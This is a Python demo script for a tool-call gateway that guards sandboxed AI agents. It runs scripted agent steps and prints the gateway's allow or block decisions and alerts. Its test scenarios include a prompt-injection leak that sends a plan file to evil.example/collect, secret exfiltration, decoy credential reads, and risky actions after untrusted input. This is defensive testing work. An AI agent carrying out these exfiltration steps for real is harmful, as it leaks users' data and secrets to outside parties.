"""End-to-end demo: scripted agents inside real sandboxes calling the real gateway.

Needs: sandbox API on :9000 and the gateway container running (gateway/run.sh).
Run:   SANDBOX_API_KEY=devkey GATEWAY_ADMIN_KEY=devadmin python gateway/demo.py
"""

import json
import os
import sys
import urllib.request

API = os.getenv("SANDBOX_API", "http://127.0.0.1:9000")
GATEWAY = os.getenv("GATEWAY", "http://127.0.0.1:8080")
KEY = os.environ["SANDBOX_API_KEY"]
ADMIN = os.getenv("GATEWAY_ADMIN_KEY", "devadmin")

# Runs INSIDE the sandbox: each step calls a gateway tool with the session token.
AGENT = r'''
import json, os, sys, urllib.request, urllib.error
gw, tok = os.environ["GATEWAY_URL"], os.environ["SESSION_TOKEN"]
for tool, body in json.loads(sys.argv[1]):
    req = urllib.request.Request(gw + "/tools/" + tool, method="GET" if body is None else "POST",
        data=None if body is None else json.dumps(body).encode(),
        headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5); print(json.dumps([tool, body, "allow", ""]))
    except urllib.error.HTTPError as e:
        d = json.loads(e.read()).get("detail", {})
        print(json.dumps([tool, body, d.get("decision", e.code) if isinstance(d, dict) else e.code,
                          d.get("rule", "") if isinstance(d, dict) else str(d)]))
'''

SCENARIOS = {
    "normal work": [
        ("list_files", None),
        ("read_file", {"path": "docs/readme.md"}),
        ("send", {"url": "https://example.com/share", "body": "public notes"}),
    ],
    "prompt injection leak": [
        ("read_file", {"path": "web/downloaded-page.html"}),
        ("read_file", {"path": "docs/q3-plan.md"}),
        ("send", {"url": "https://evil.example/collect", "body": "Q3 plan..."}),
    ],
    "secret to unapproved destination": [
        ("read_file", {"path": "secrets/api-keys.txt"}),
        ("send", {"url": "https://api.internal.example/v1", "body": "key"}),
    ],
    "decoy credentials": [
        ("read_file", {"path": ".decoy/aws-credentials"}),
        ("fetch_url", {"url": "https://example.com"}),
    ],
    "untrusted page then risky action": [
        ("fetch_url", {"url": "https://example.com/blog"}),
        ("action", {"kind": "permissions", "target": "repo"}),
    ],
    "untagged file then credentials": [
        ("read_file", {"path": "docs/untagged.txt"}),
        ("action", {"kind": "credentials", "target": "vault"}),
    ],
}


def http(method, url, key, body=None):
    req = urllib.request.Request(url, method=method, data=None if body is None else json.dumps(body).encode(),
                                 headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read() or b"null")


def main() -> int:
    import docker  # host side only
    client = docker.from_env()
    created = []
    try:
        for name, steps in SCENARIOS.items():
            info = http("POST", f"{API}/sessions", KEY, {})
            created.append(info["session_id"])
            if not info["gateway_attached"]:
                print("gateway is not running; start it with gateway/run.sh"); return 1
            out = client.containers.get(info["container_name"]).exec_run(
                ["python3", "-c", AGENT, json.dumps(steps)], user="10001:10001").output.decode()
            print(f"\n== {name}  (session {info['session_id'][:8]})")
            for line in out.strip().splitlines():
                tool, body, decision, rule = json.loads(line)
                arg = (body or {}).get("path") or (body or {}).get("url") or (body or {}).get("kind") or ""
                print(f"   {decision.upper():6} {tool:11} {arg:38} {rule}")
        alerts = http("GET", f"{GATEWAY}/admin/alerts", ADMIN)
        print(f"\nalerts raised: {len(alerts)}")
        for a in alerts:
            print(f"   {a['session_id'][:8]}  {a['rule']}: {a['reason']}")
    finally:
        for sid in created:
            http("DELETE", f"{API}/sessions/{sid}", KEY)
    return 0


if __name__ == "__main__":
    sys.exit(main())
